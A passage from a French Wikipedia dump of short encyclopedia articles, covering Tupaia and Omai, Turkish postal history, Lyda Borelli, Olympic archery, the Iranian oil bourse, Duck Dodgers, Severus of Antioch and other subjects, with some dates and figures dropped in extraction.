Dans le cadre de ce voyage, Tupaia devient le premier Polynésien à peindre à l'aquarelle, une technique qu'il apprend du peintre Sydney Parkinson, son ami. Des œuvres attribuées à Tupaia sont aujourd'hui conservées au musée de la British Library à Londres. Ces dessins décrivent les premiers contacts entre les Anglais, les Polynésiens et les Aborigènes d'Australie et la vie sur les îles. Tupaia est aussi le premier Polynésien à apprendre l'écriture latine.
Les circonstances de la mort de Tupaia sont controversées. L"'Endeavour" fait une escale pour se réapprovisionner et faire des réparations à Batavia (actuelle Jakarta) dans l'île de Java. Atteint du scorbut à bord, Tupaia aurait contracté le paludisme. Son page et lui, ainsi que de nombreux membres d'équipage, y auraient succombé. Cook enregistre le décès de Tupaia dans son journal de bord le , et écrit : « C’était un homme intelligent, perspicace, ingénieux, mais également fier et obstiné. » Cependant, l'auteur Joan Druett souligne que Joseph Banks évoque la mort de Tupaia dès le . Selon elle, Tupaia, affaibli par le scorbut, serait possiblement mort de la fièvre typhoïde plus tôt que ne l'a déclaré Cook, celui-ci souhaitant faire croire qu'aucun membre de son équipage ne serait mort du scorbut à bord.
En 1774, lors d'une visite à Raiatea, terre natale de Tupaia, Cook le mentionne de nouveau dans son journal. Il écrit que Tupaia lui a été d'une aide précieuse pour comprendre les coutumes religieuses polynésiennes, et que, en son absence, l'équipage britannique ne pouvait que faire des observations et interprétations hasardeuses :
Postérité.
Bien que peu mentionné par Cook, Tupaia, compagnon de voyage polynésien d'étranges visiteurs blancs, devint célèbre parmi les Maoris. Lorsque Cook visite à nouveau la Nouvelle-Zélande en 1773, des peuples maoris avec qui ni Cook, ni Tupaia n'avaient eu de contact s'enquièrent à son sujet. Cette célébrité semble être due au fait que Tupa'ia venait du lieu d'origine des Maoris et que leurs traditions avaient conservé le souvenir de cette terre sacrée. Aujourd'hui, Tupaia est un personnage important pour l'histoire des Maoris de Nouvelle-Zélande et l'anniversaire de son arrivée dans le pays a été commémorée par le gouvernement néo-zélandais en 2019.
Bien qu'il y eût plusieurs peintres à bord de l"'Endeavour", aucun portrait de Tupa'ia n'est arrivé jusqu'à nous, probablement pour que la primeur du voyage revienne à J. Banks et J. Cook.
Plusieurs œuvres récentes ont été consacrées à Tupaia. En 2010, l'auteure néo-zélandaise Joan Druett a écrit un livre sur ce personnage, traduit en français. En 2015, la réalisatrice néo-zélandaise Lala Rolls lui a consacré un documentaire de intitulé "Tupaia" coproduit par des Néo-Zélandais et des Tahitiens, notamment Oceania Films et Polynésie"." Tupaia y est interprété par l'acteur maori Kirk Torrance. La chaine de télévision néo-zélandaise Maori TV a aussi commandé trois épisodes de sur le personnage.
L'un des Boeing 787 de la compagnie Air Tahiti Nui porte maintenant son nom en guise d'hommage.
Une espèce de crevette d'eau douce de Polynésie, "Caridina tupaia", est nommée en son honneur.
Des descendants, dont certains portent encore le nom Tupaia, vivent encore à Ra'iätea sur les terres ancestrales Motu tapu, Rotopiti et 'Ärava, toponymes qui existent aussi à Rotorua en Nouvelle-Zélande.
Son descendant, Teuraiterai Tupaia, est champion de France de Javelot et a participé aux Jeux Olympiques de Paris en 2024.

</doc>
<doc id="2846586" url="https://fr.wikipedia.org/wiki?curid=2846586" title="Histoire philatélique et postale de la Turquie">
Histoire philatélique et postale de la Turquie

Ceci est une introduction à l'histoire postale et philatélique de la Turquie.
L'Empire ottoman.
Les bureaux étrangers en Turquie.
İstanbul / Constantinople.
Un bureau français a été ouvert à İstanbul, alors connu avec la dénomination Constantinople en 1799.
À partir de 1862, les timbres français y étaient utilisés avec l'oblitération par losange petits chiffres de numéro 3707. Par la suite le cachet gros chiffres 5083 a été utilisé.
Un bureau britannique a été ouvert en 1857. Dans un premier temps les timbres de Grande-Bretagne ont été utilisés avec une oblitération par un cachet comportant un C majuscule (pour CONSTANTINOPLE) ou un cachet circulaire « BRITISH POST OFFICE CONSTANTINOPLE ». En 1887, un autre bureau a été ouvert avec la dénomination Stamboul il utilisait un cachet avec un S majuscule ou la marque circulaire : « BRITISH POST OFFICE STAMBOUL ».
Du démantèlement de l'Empire ottoman à la République.
À la fin de la Première Guerre mondiale, l'Empire ottoman, qui appartenait au camp des puissances centrales est démantelé. La Turquie vit alors une période de transition jusqu'à la proclamation de la république.

</doc>
<doc id="2846589" url="https://fr.wikipedia.org/wiki?curid=2846589" title="Gamzat-bek">
Gamzat-bek

Gamzat-bek (en russe: Гамзат-бек), né en 1789, mort le , est le second imam du Daghestan de 1832 à 1834.
Fils d'un bey (chef de clan) Avar, il devient disciple du soufisme puis imam du Daghestan à la mort de Mohammed Ghazi en 1832.
En août 1834, il attaque les Khans avars ralliés aux Russes. Il réussit en prenant Khunzakh, la capitale du khanat de Pakkou-Bekkhe. Il exécute sa dirigeante Pakhubike et ses fils.
Les 19 mois suivants, il combat les Russes. Les partisans des khans avars conspirent contre lui et il est assassiné le par Hadji Murad, qui veut venger la mort de Pakhubike et de ses enfants. Cet évènement est rapporté par Tolstoï dans la nouvelle "Hadji Murad", écrite en 1904.
Chamil lui succède et devient le troisième imam du Daghestan.

</doc>
<doc id="2846596" url="https://fr.wikipedia.org/wiki?curid=2846596" title="Lyda Borelli">
Lyda Borelli

Lyda Borelli (Rivarolo (Gênes), - Rome, ) est une actrice de théâtre et de cinéma italienne, diva du cinéma muet italien.
Biographie.
Lyda Borelli commence sa carrière au théâtre en 1902 à l'âge de 18 ans et débute au cinéma en 1913. Elle était pilote automobile et se passionnait pour l'aviation. Elle était mannequin et promouvait la jupe culote (mal vue a cette époque). En 1918, elle se fiance avec un industriel, Vittorio Cini comte de Monselice, qu'elle épouse la même année et elle arrête la scène et le cinéma. 
Avec Vittorio Cini, elle a quatre enfants, dont Giorgio qui meurt dans un accident d'avion le 31 août 1949, Mynna et les jumelles Ylda et Yana.
Après la mort tragique de son fils, l'ancienne actrice sombre dans l'alcool. Elle est décédée le à Rome et est enterrée, avec son mari et son fils, dans le cimetière monumental de la Chartreuse de Ferrare, dans une chapelle conçue par .
Carrière artistique.
Lyda Borelli nait dans le quartier de Rivarolo au sein d'une famille d'artistes (son père, Napoleone, et sa sœur, Alda, étaient acteurs), et elle commence sa carrière au théâtre avec Paola Pezzaglia dans le drame de Pierre Decourcelle "Les deux gosses". En 1904, elle fait partie de la compagnie de Virgilio Talli avec Emma Gramatica et elle joue le rôle de Favetta dans la première représentation de "" de Gabriele D'Annunzio. En peu de temps elle devient une des "prime donne" du théâtre italien, considérée comme l'héritière de Eleonora Duse, aux côtés de laquelle elle joue en 1905.
En 1913, alors qu'elle est dans la compagnie Piperno-Borelli-Gandusio, elle joue dans son premier film, "", dirigé par Mario Caserini. Le film est un succès, et Lyda Borelli devient une diva. Des néologismes comme « borellismo » et « borelleggiare » apparaissent. Sa renommée n'est égalée que par l'autre diva, Francesca Bertini.
Antonio Gramsci dans "Avanti" écrivit à son sujet : « Borelli est par excellence l'artiste du film où c'est le corps humain qui parle, dans sa plasticité toujours renouvelée ».
La carrière cinématographique de Lyda Borelli dure à cinq ans, pendant lesquels elle tourne treize films. Parmi ses succès, ', ' avec des musiques de Pietro Mascagni et ". En 1918 elle abandonne le cinéma après son mariage avec le comte Vittorio Cini.
Postérité.
À Bologne, on a donné son nom à la « Maison de retraite pour les artistes dramatiques » (") qui se trouve Via Saragozza, auprès de l'Arc du Meloncello.

</doc>
<doc id="2846603" url="https://fr.wikipedia.org/wiki?curid=2846603" title="Al Tucker">
Al Tucker

Albert Amos Tucker Jr. (né le à Dayton, Ohio ; décédé le ) était un joueur américain de basket-ball.
Biographie.
Ailier issu de l'Université baptiste de l'Oklahoma, Tucker joue quatre saisons (1967-1971) en National Basketball Association et une saison (1971-1972) en American Basketball Association en tant que membre des SuperSonics de Seattle, des Royals de Cincinnati, des Chicago Bulls, des Bullets de Baltimore et The Floridians. Il réalise une moyenne de 10,1 points par match en carrière, étant élu dans la "NBA All-Rookie Team" lors de la saison 1967-1968 NBA.
Tucker est le premier joueur drafté de l'histoire des SuperSonics de Seattle.

</doc>
<doc id="2846621" url="https://fr.wikipedia.org/wiki?curid=2846621" title="Grossouvre (homonymie)">
Grossouvre (homonymie)



</doc>
<doc id="2846623" url="https://fr.wikipedia.org/wiki?curid=2846623" title="Tir à l'arc aux Jeux olympiques">
Tir à l'arc aux Jeux olympiques

Le tir à l'arc a fait sa première apparition lors des Jeux olympiques d'été de 1900. Absent du programme de 1924 à 1968, le tir à l'arc a été réintroduit à l'occasion des Jeux olympiques d'été de 1972 à Munich.
Les épreuves de tir à l'arc ont été disputées lors de seize éditions des Jeux olympiques. Quatre-vingt-douze nations ont déjà pris part à l'épreuve, la France apparaissant le plus souvent avec quatorze fois. Depuis 1972, cette épreuve se déroule sous l'égide de la World Archery Federation (anciennement FITA). Seul l'arc classique est disputé aux jeux olympiques.
Le tir à l'arbalète perdit une occasion de reconnaissance par le CIO après le concours d'arbalète de l'exposition universelle de 1900 (remporté par le français Chambroy).
Histoire.
De 1900 à 1920.
Pendant cette période, aucune fédération internationale n'existe pour réglementer la pratique du tir à l'arc. Le choix des épreuves est laissé à l'initiative du pays organisateur, et celles-ci sont généralement représentatives des compétitions disputées localement. Un compétiteur pouvait s'inscrire à plusieurs épreuves.
Le tir à l'arc a fait sa première apparition lors des Jeux olympiques d'été de 1900 à Paris. Six épreuves furent disputées à l'occasion.
Les Jeux suivants se déroulent à St. Louis en 1904. Six épreuves sont disputées, mais aucun athlète non américain n'y participe. Par contre, il y a deux épreuves féminines individuelles, une épreuve masculine par équipes et une épreuve féminine par équipes. En 1908, à Londres, il y a eu trois épreuves, dont une à la distance de , organisée pour les archers français et belges, et une épreuve féminine, mais pas d'épreuve par équipes.
Le tir à l'arc n'a pas été disputé en 1912, mais est réapparu en 1920 à Anvers, avec dix épreuves (dont cinq par équipes), mais aucune épreuve féminine.
Durant ces quatre Jeux olympiques, seules cinq nations ont participé à l'épreuve de tir à l'arc : l'Angleterre, la Belgique, les États-Unis, la France et les Pays-Bas.
Chaque jeu a vu la participation de trois nations au plus.
Entre 1920 et 1972, le tir à l'arc n'a pas été disputé aux Jeux olympiques.
Depuis 1972.
Le à Lwow en Pologne, la France, la Tchécoslovaquie, la Suède, la Pologne, les États-Unis, la Hongrie, et l'Italie fondent la Fédération internationale de tir à l'arc (FITA), devenue en 2011 la World Archery Federation (WA). Le but de l'organisation est de créer des championnats de tir à l'arc réguliers et d'obtenir que le tir à l'arc redevienne discipline olympique. Cet objectif est atteint, lors des Jeux olympiques d'été de 1972, à Munich. Lors de cette édition, le tir à l'arc ne comporte qu'une seule épreuve masculine et une féminine sous la forme d'un tir « double FITA ». En 1988, les compétitions par équipes sont ajoutées aux deux compétitions individuelles.
Depuis 1992, le format utilisé est le tir olympique de qualification, suivi de duels.
La Corée du Sud participe aux Jeux de 1972, mais ne remporte aucune médaille. Elle est absente des pas de tir jusqu'en 1984, où elle remporte la médaille d'or en individuel féminin.
Depuis 1988 à Séoul, année de l'introduction du tir par équipes, les Coréennes ont remporté l'intégralité des médailles d'or par équipes, et il n'y a qu'en 2008 à Pékin où la médaille d'or en individuel leur a échappé au bénéfice de la Chine.
Les hommes sont champions olympiques par équipes en 1988 ainsi que depuis 2000, et en individuel avec Oh Jyn-Hyek à Londres en 2012.
Description des épreuves.
Le tir à l'arc olympique moderne est composé de cinq épreuves : Hommes individuels, femmes individuelles, hommes par équipes, femmes par équipes et équipes mixtes. Pour ces cinq épreuves, la distance de l'archer à la cible est de . 
Épreuve individuelle.
Dans les épreuves individuelles, participent. La compétition débute avec le tir de qualification qui consiste à tirer (en deux séries de six volées de six flèches).
Le classement obtenu détermine la place de l'archer dans le tableau des finales.
Période 1992 - 2004.
Les matches des , et de finale se déroulaient en six volées de trois flèches, les archers tirant simultanément, le temps alloué étant de deux minutes par volée.
Jeux de 2008.
Les phases finales commencent en de finale, où l'archer ayant fini premier du tir de qualification rencontre le , le le et ainsi de suite. Les matchs se déroulent en quatre volées de trois flèches, chaque volée se faisant en tir alterné : les archers tirent une flèche chacun leur tour, avec par flèche.
L'archer remportant le duel participe au tour suivant, le perdant est éliminé, sauf en demi-finales, où les perdants se rencontrent lors du match pour la .
Depuis 2012.
Le format de la compétition reste identique mais le déroulement de chaque match change. Chaque archer tire un maximum de cinq volées de trois flèches en tir alterné. Chaque volée est appelée "set", l'archer avec le meilleur total du set marque deux points. Un point est marqué par chacun des deux archers en cas d'égalité. Le vainqueur du match est le premier à six points. Si les deux archers sont à égalité après les cinq volées, le match se joue sur un tir de barrage, la flèche la plus proche du centre l'emporte.
Épreuve par équipes.
Chaque pays ayant trois archers engagés dans la compétition individuelle participe aux finales par équipes. Le score de l'équipe est déterminé en additionnant les scores de l'épreuve individuelle des trois archers. Une épreuve de double mixte a lieu pour la première fois en 2020. Elle se déroule sous forme de duel. La cible est également à . L'équipe est composée d'une femme et d'un homme.
La phase finale commence en de finale, mais comme le nombre d'équipe est habituellement compris entre neuf et quinze, les équipes les mieux classées bénéficient d'une exemption lors du premier tour. Les matches comportent quatre volées de six flèches, chaque archer tirant deux flèches par volée.
Période 1992 - 2004.
Auparavant, les matches se déroulaient en trois volées de neuf flèches (trois flèches par archer).
Qualification.
Les quotas de qualification sont alloués aux comités olympiques nationaux, plutôt qu'aux athlètes.
Un pays peut engager au plus trois hommes et trois femmes.
Il y a cinq moyens pour un comité national d'obtenir ses quotas pour les Jeux olympiques.
Pour chaque sexe :
Chaque comité olympique recevant trois places (i.e., le pays organisateur, les 8 meilleures nations des derniers championnats du monde, et toute autre nation pouvant prendre 3 places parmi les 37 restantes) peut engager ses trois archers dans la compétition par équipes.
Résultats.
Tableau des médailles depuis 1972.
1972 a marqué le début de l'archerie moderne aux Jeux Olympiques. Les épreuves ont commencé à être standardisées, et plusieurs nations y ont participé.
Le tableau ci-dessous présente le bilan, par nations, des médailles obtenues en tir à l'arc lors des Jeux olympiques d'été, de Munich 1972 à Paris 2024. Le rang est obtenu par le décompte des médailles d'or, puis en cas d'ex aequo, des médailles d'argent, puis de bronze.
Tableau des médailles complet (depuis 1900).
Ce tableau inclut les résultats des épreuves de 1900, 1904, 1908, et 1920. Ces quatre années ont précédé la compétition moderne et standardisée, suivant les règles de la Fédération internationale de tir à l'arc, et ont été disputées par au plus trois nations. En 1904, seuls les États-Unis ont participé. Les autres nations à avoir participé à la compétition dans cette période sont la France, la Belgique, les Pays-Bas et la Grande-Bretagne.
La Corée du Sud prend la tête du tableau à l'issue des Jeux de 2008, où les États-Unis sont repartis sans médailles.
La domination de la Corée du Sud sur la discipline est récente puisque sa première médaille ne date que de 1984.
Records.
Records de médailles.
Archers les plus médaillés aux Jeux olympiques (avant les jeux de Pékin 2008) à titre individuel et par équipes.
Records olympiques.
Les records olympiques du tir à l'arc ne sont établis que pour les compétitions depuis 1992.
Ils sont suivis sur les items suivants :
(*) Le , lors de l'épreuve de classement, Park Sung-hyun (F) avec , Im Dong-hyun (H) avec , et l'équipe féminine de Corée du Sud (Park Sung-hyun, Lee Sung-jin, Yun Mi-jin) avec ont battu leur record du monde respectif. L'épreuve ayant eu lieu avant la cérémonie d'ouverture officielle, ces records ne sont pas comptabilisés dans les records olympiques.
De la même manière, le , Im Dong-hyun (H) avec et l'équipe masculine de Corée su Sud avec ont battu leur record du monde, mais ne seront pas comptabilisés comme record olympique.

</doc>
<doc id="2846624" url="https://fr.wikipedia.org/wiki?curid=2846624" title="C 3">
C 3



</doc>
<doc id="2846627" url="https://fr.wikipedia.org/wiki?curid=2846627" title="C-3">
C-3



</doc>
<doc id="2846628" url="https://fr.wikipedia.org/wiki?curid=2846628" title="Nowellia curvifolia">
Nowellia curvifolia

Nowellia curvifolia est une espèce d'hépatiques (plantes primitives, embryophytes, non-vasculaires) de l'hémisphère nord, appartenant à l'ordre des "Jungermanniales". Selon les classifications, elle appartient à la classe des "Jungermanniopsida" ou à celle des "Hepatopsida".
Les anglophones l'appellent « "Rustwort" » ou parfois « "Wood-rus"t ».
Description.
On la trouve notamment comme épiphyte corticole, essentiellement sur du bois mort et humide, et parfois sur l'écorce d'arbres debout, sur les faces où l'eau ruisselle. 
Les feuilles, d'environ , en forme de goutte allongée et affinée en pointe, incurvées, ont une couleur allant du vert (quand elles sont jeunes) au brun-rougeâtre. Les feuilles ont une forme proche de celles de "Cephalozia bicuspidata", mais cette dernière ne prend pas de couleur rougeâtre.
Habitat.
Zones boisées et d'ambiance très humides, bord de rivière, creux, ravins. En Grande-Bretagne, elle est plus présente à l'ouest qu'à l'est.
Rareté ou menace.
C’est une plante discrète, notamment menacée par la régression des milieux frais et humides qui lui conviennent.

</doc>
<doc id="2846633" url="https://fr.wikipedia.org/wiki?curid=2846633" title="Invasion du val d'Aran">
Invasion du val d'Aran



</doc>
<doc id="2846637" url="https://fr.wikipedia.org/wiki?curid=2846637" title="Bourse internationale iranienne du pétrole">
Bourse internationale iranienne du pétrole

La Bourse internationale iranienne du pétrole ("Iranian International Petroleum Exchange" IIPE) est une bourse ouverte le où s'échangent certains dérivés du pétrole et à terme, le pétrole brut. La particularité de cette bourse est que les échanges se font principalement en rial iranien et non en dollar comme dans les autres bourses mondiales. Cette particularité met à mal la suprématie de la monnaie américaine qui sert de monnaie étalon dans la vente de pétrole (pétrodollar).
La bourse est située sur l'île de Kish, une zone franche.
Histoire.
La création d'une telle bourse s'inscrit dans les relations tendues entre l'Iran et les États-Unis et surtout l'élection de Mahmoud Ahmadinejad comme Président de la République d'Iran .
Dans un premier temps, des rumeurs ont laissé penser que la monnaie qui servira d'échange serait l'euro, qui devient de plus en plus viable par rapport au dollar. Finalement, c'est la monnaie nationale iranienne qui est choisie. À terme, d'autres monnaies, à l'exception du dollar, pourraient être utilisées.
Conséquence.
Le passage à une autre monnaie que le dollar a des conséquences économiques pour les États-Unis. Le dollar servant de monnaie d'échange, les pays étrangers se voyaient dans l'obligation d'acheter des dollars auprès de la réserve fédérale des États-Unis, qui est la seule institution autorisée à émettre la monnaie nationale américaine.
Le passage à une autre monnaie diminue le recours aux dollars pour payer le pétrole. Les rentrées d'argent diminuent donc aux États-Unis. Ce qui, dans un contexte économique américain morose et un dollar faible face à l'euro et au yen, peut pousser nombre de pays à utiliser une autre monnaie que le dollar.

</doc>
<doc id="2846639" url="https://fr.wikipedia.org/wiki?curid=2846639" title="Omai">
Omai

Omai, ou Mai, né à Raiatea en 1751 et mort à Huahine en 1779 est un explorateur polynésien.
Il est connu pour avoir accompagné l'une des expéditions du capitaine James Cook.
Biographie.
Vers l'âge de 11 ans, Omai quitta Raiatea et s'installa à Tahiti avec ses parents. Là, il servit la monarchie tahitienne en qualité de .
En , il rejoignit le navire britannique "HMS Adventure", sous commandement du capitaine Tobias Furneaux, lorsque celui-ci visita la Polynésie. Le "HMS Adventure" faisait partie de la seconde expédition du capitaine James Cook dans l'océan Pacifique. Cook avait pour but d'explorer les régions inconnues de cet océan.
Omai accompagna les Britanniques jusqu'à Londres, où il découvrit la société londonienne, avec sir Joseph Banks pour guide. Il fut présenté au roi George III. Il fut le premier Océanien à visiter le Royaume-Uni. Il y vécut de 1774 à 1776, s'intégrant à la haute société britannique, participant régulièrement à des bals, à des dîners de la "Royal Society", et visitant l'opéra.
En 1776, il participa au troisième voyage de Cook, qui le ramena à Huahine. Omai lui servit d'interprète avec les peuples polynésiens lors des deux voyages auxquels il prit part.
Lorsque William Bligh visita Tahiti en 1789, il apprit qu'Omai était mort vers 1779
Son séjour à Londres avait suscité la curiosité et l'imagination des Britanniques. En 1785, l'écrivain John O'Keefe mit en scène une pièce de théâtre intitulée "Omai – A Voyage ‘round the World" ("Omai - Un voyage autour du monde"). La pièce fut jouée à Covent Garden.
Adaptation.
La vie de Ma'i fait l'objet de la deuxième pièce de théâtre créée par Titaua Porcher, "Oh my!... Omai!." Titaua Porcher fait revenir Ma'i dans le Pape'ete d'aujourd'hui; se trouvent ainsi questionnés les rapports entre passé et présent, Polynésie et Europe, à travers un regard sans concession mais résolument tourné vers l'avenir. Le talentueux Rehia Tepa incarne le rôle-titre. Titaua Porcher a assuré la mise en scène, Florence Condat la direction d'acteurs, Torea Huiotu la réalisation des costumes et des décors, Poemoana Teriinohorai la chorégraphie. La pièce a été représentée à Tahiti les 3 et 4 février 2023 salle Manu Iti à Paea et les 5 et 6 avril 2023 au Petit Théâtre de la Maison de la Culture - Te Fare Tauhiti Nui à Pape'ete. Elle a de nouveau connu un franc succès au Petit Théâtre de la Maison de la Culture - Te Fare Tauhiti Nui à Pape'ete lors des représentations des 15 et 16 septembre 2023. Elle sera rejouée le 20 octobre 2023 dans le cadre du Salon du Livre au Grand Théâtre de la Maison de la Culture - Te Fare Tauhiti Nui à Pape'ete, conjointement à la publication de la pièce aux éditions Au Vent des îles.

</doc>
<doc id="2846646" url="https://fr.wikipedia.org/wiki?curid=2846646" title="U34">
U34



</doc>
<doc id="2846647" url="https://fr.wikipedia.org/wiki?curid=2846647" title="U 34">
U 34



</doc>
<doc id="2846661" url="https://fr.wikipedia.org/wiki?curid=2846661" title="AXIMA">
AXIMA



</doc>
<doc id="2846663" url="https://fr.wikipedia.org/wiki?curid=2846663" title="Olivier Martin">
Olivier Martin

Olivier Beraud Martin (auparavant nommé Olivier Martin), sociologue et statisticien, est professeur de sociologie à la faculté "Sociétés et Humanités" de l'Université Paris Cité. 
Il est membre du Centre de recherche sur les liens sociaux (CERLIS), dont il a été le directeur de 2014 à 2023.
Depuis octobre 2024, il est lauréat de l'Institut Universitaire de France (IUF) pour ses travaux de recherche sur la sociologie et la sociologie historique de la quantification.
Biographie.
Olivier Beraud Martin est ancien élève de l'École nationale de la statistique et de l'administration économique (ENSAE - Institut Polytechnique de Paris), de l'EHESS et de Sciences Po Paris.
Il est membre du Centre de recherche sur les liens sociaux (CERLIS), laboratoire du CNRS, de l'Université Paris Cité (précédemment de l'Université Paris Descartes) et de l'Université Sorbonne Nouvelle. Il a dirigé ce laboratoire de 2014 à 2023.
Ses travaux portent sur la sociologie de la quantification (statistiques et société), la sociologie du monde universitaire, la sociologie des sciences ainsi que la sociologie des pratiques numériques et de leurs usages. En 2023, Olivier Beraud Martin a publié un essai destiné à un large public et défendant la nécessité de se réarmer politiquement face aux chiffres ("Chiffre", Anamosa, 2023).
Ses travaux en sociologie de la quantification proposent d'étendre l'analyse sociologie des pratiques de quantification à tous les chiffres, indicateurs et nombres, et ainsi d'élargir les analyses (notamment proposées par Alain Desrosières) consacrées aux statistiques et indicateurs socio-numériques. Il propose d'analyser toute forme de quantification comme la conjugaison de trois registres d'éléments indissociables : des conventions ; des dispositifs techniques ; des pouvoirs. 
Entre et novembre 2015, il a présidé la section 19 du Conseil national des universités (sociologie, démographie). Il a également été directeur de l'école doctorale, « Sciences humaines et sociales : cultures, individus, sociétés », intégrée aux structures de recherche et de formation de l'université Paris Descartes et associée à la Faculté des sciences humaines et sociales de l'université de la Sorbonne.

</doc>
<doc id="2846671" url="https://fr.wikipedia.org/wiki?curid=2846671" title="Institut Alfred-Wegener pour la recherche polaire et marine">
Institut Alfred-Wegener pour la recherche polaire et marine

L'Institut Alfred-Wegener pour la recherche polaire et marine ("Alfred-Wegener-Institut, Helmholtz-Zentrum für Polar- und Meeresforschung" en allemand) est un institut scientifique situé à Bremerhaven, dans le nord de l'Allemagne. Il a été fondé en 1980, et nommé d'après le météorologue et climatologue Alfred Wegener (1880-1930).
Outre son site principal à Bremerhaven, l'institut a des stations de recherche en Arctique et en Antarctique, et dispose d'un navire de recherche, le FS "Polarstern".
Études.
Des études de l'Institut sur le parc éolien de l'île de Borkum, construit de 2011 à 2013, indiquent que les fermes éoliennes seraient un environnement favorable pour les homards et permettraient l'installation d'une riche biodiversité qui s'installerait au pied des turbines marines.
Organisation.
L’institut est organisé en quatre départements principaux :
Relations internationales.
L'institut est membre de l’Université de l'Arctique. UArctic est un réseau international d’universités, d’instituts de recherche et d’organisations ayant pour but de promouvoir, coordonner et soutenir la recherche ainsi que l’éducation en régions arctiques.

</doc>
<doc id="2846676" url="https://fr.wikipedia.org/wiki?curid=2846676" title="C.3">
C.3



</doc>
<doc id="2846679" url="https://fr.wikipedia.org/wiki?curid=2846679" title="Institut Alfred Wegener">
Institut Alfred Wegener



</doc>
<doc id="2846693" url="https://fr.wikipedia.org/wiki?curid=2846693" title="Hypatios d'Éphèse">
Hypatios d'Éphèse

Hypatios ou Hypace d'Éphèse est l'évêque de la métropole d'Asie dans les années 530. Pendant cette période, il est l'un des chefs du parti orthodoxe dans la lutte contre le monophysisme : à ce titre, il préside la conférence convoquée par Justinien à Constantinople en 531, puis il est le porte-parole des évêques orthodoxes au concile de Constantinople en 536, où Sévère d'Antioche et les monophysites sont condamnés. De 533 à 534, l'empereur l'envoie à Rome auprès du pape Jean II pour obtenir une décision sur le théopaschisme. C'est un des premiers théoriciens qui défend l'utilisation des images dans l'art ecclésiastique, comme un moyen didactique approprié pour aider les personnes de peu d'éducation.

</doc>
<doc id="2846697" url="https://fr.wikipedia.org/wiki?curid=2846697" title="Laurent albarracin">
Laurent albarracin



</doc>
<doc id="2846711" url="https://fr.wikipedia.org/wiki?curid=2846711" title="Gold Dagger Award">
Gold Dagger Award

Le est un prix littéraire britannique décerné annuellement au meilleur roman policier de l'année par la "Crime Writers' Association", une association d’écrivains de romans policiers.
Créé en 1955 sous le titre ', il devient le ' en 1960, puis le ' de 1995 à 2002 lorsque la marque de scotch whisky Macallan en devient le sponsor. De 1969 à 2005, le ' est décerné au candidat placé deuxième.
En 2006, la banque devient le mécène du prix. Le Silver Dagger Award est supprimé et le prix principal nommé '. Il fut doté d'une récompense de £, ce qui en fit le prix du roman policier le plus richement doté du monde. La banque se retire après la remise du prix en 2008 et le prix revient au nom de ses débuts, ', tout en voyant sa dotation passer de £ à £. L'actuel mécène est la librairie londonienne Goldsboro.
Palmarès.
Palmarès :

</doc>
<doc id="2846714" url="https://fr.wikipedia.org/wiki?curid=2846714" title="Club canin canadien">
Club canin canadien

&lt;/rss&gt;Établi en 1887, le Club canin canadien ("Canadian Kennel Club--CKC") est l'association cynologique du Canada ; il y est le registre primaire de chiens de race. Il compte à nos jours 174 races. Le CCC n'est pas membre de la Fédération cynologique internationale. Il s'occupe également de promouvoir des expositions canines ou des concours d'obéissance et de conférer les titres de champions ou autres titres dans tous types de concours canins. 

</doc>
<doc id="2846715" url="https://fr.wikipedia.org/wiki?curid=2846715" title="Duck Dodgers">
Duck Dodgers

Duck Dodgers est le héros d'une série de dessins animés produits par Warner Bros. avec Daffy Duck dans le rôle du personnage éponyme de héros intergalactique.
Le cartoon fondateur.
Duck Dodgers fait sa première apparition en 1953 dans "Duck Dodgers in the 24½th Century" (Duck Dodgers au et des poussières), réalisé par Chuck Jones. Il s’agit d’une parodie de "Flash Gordon" et de "Buck Rogers au XXVe siècle", séries culte de la radio et de la télévision américaines dans les années cinquante. Daffy Duck, l’insupportable canard vantard et égocentrique du cinéma d’animation, se voit confier le rôle du héros dans la nouvelle série de science-fiction. 
Le film est considéré comme l’une des comédies les plus réussies du cinéma d’animation. Sa popularité ne s’est jamais démentie et en 2003 il est sélectionné pour figurer dans le premier volume de la compilation "Looney Tunes Golden Collection". 
Le scénario raconte les aventures de Duck Dodgers à la recherche de l’Illudium Phosdex. Cet élément chimique rare, atome constitutif de la crème à raser, ne se trouve plus que sur la mystérieuse planète X. Daffy Duck atterrit sur cette planète et en prend possession au nom de la Terre au moment où Marvin le Martien fait de même au nom de la planète Mars. Les deux champions planétaires vont devoir s’affronter en un combat où la ruse compte encore plus que la force brute.
Le film a été tourné au plus fort de la paranoïa anti-communiste aux États-Unis pendant les années 1950 ; aussi certains critiques y ont vu une satire de la guerre froide et de la course aux armements.
Suites.
Après "Duck Dodgers in the 24½th Century" (1953), Daffy reprend son rôle dans "Duck Dodgers and the Return of the 24½th Century" (1980) puis dans "Attack of the Drones" (2003).
La série.
De 2004 à 2009, Warner Bros produit une série télévisée d'animation consacrée à Duck Dodgers. Constituée de 39 épisodes de 22 minutes chacun, elle fut diffusée sur Boomerang à partir du 5 janvier 2004. La chanson du générique est chantée par Tom Jones.
Dans cette série, Duck Dodgers, en tant que capitaine de son propre vaisseau, réalise diverses missions pour le Protectorat Galactique, sous les ordres du Docteur Q.I. de Génie. L'ennemi principal du Protectorat étant Mars, Dodgers se retrouve régulièrement confronté au Commandant des Martiens, Marvin le Martien. Il a aussi réussi l'exploit de se mettre personnellement à dos la Reine de Mars en se révélant trop bête que pour remarquer ses avances romantiques et y répondre. 
Dans le double épisode "Déclaration de Guerre ou de Paix" de la seconde saison, il est brièvement promu Amiral à la demande du Général Z-9, Ministre martien de la Défense puis rétrogradé au rang de Capitaine après la découverte de son rôle dans la crise Terre-Mars qu'il a provoqué dans la première partie (et dont le Général Z-9 a profité pour mener son coup d'État).

</doc>
<doc id="2846716" url="https://fr.wikipedia.org/wiki?curid=2846716" title="Sévère d'Antioche">
Sévère d'Antioche

Sévère d'Antioche, né à Sozopolis en Pisidie vers 465, et mort à Xoïs en Égypte le , fut patriarche d'Antioche du au . C'est un des principaux théologiens miaphysites.
Biographie.
Selon son contemporain et ami Zacharie le Rhéteur, qui lui consacra une biographie, il était issu d'une famille de rang élevé : son père était membre du sénat () de la cité de Sozopolis, et il descendait d'un autre Sévère, évêque de la même cité à l'époque du concile d'Éphèse. Il avait deux frères plus âgés que lui, et tous trois furent envoyés étudier à Alexandrie par leur mère devenue veuve. À cette époque, affirme Zacharie, il n'avait pas encore reçu le baptême chrétien car c'était la coutume, dans sa région natale, de n'être baptisé qu'à l'âge adulte. Après de brillantes études de rhétorique à Alexandrie, il alla poursuivre sa formation à l'école de droit romain de Beyrouth, ce qui était à l'époque le parcours typique d'un fils de bonne famille.
